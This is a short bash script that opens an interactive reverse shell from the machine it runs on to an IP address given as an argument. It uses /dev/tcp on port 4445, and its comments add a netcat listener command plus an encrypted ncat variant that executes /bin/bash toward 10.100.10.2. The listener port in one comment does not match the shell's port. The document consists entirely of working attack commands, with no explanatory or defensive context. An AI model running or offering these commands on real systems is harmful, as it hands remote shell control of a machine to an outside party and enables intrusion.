#!/bin/bash
IP="${1}"
bash -c "bash -i >& /dev/tcp/${IP}/4445 0>&1"
# nc -lp 4454 -vv 

# Encrypted TCP tunnel
# ncat 10.100.10.2 4445 --ssl -e /bin/bash -v
# ncat -vl 4445 --ssl 
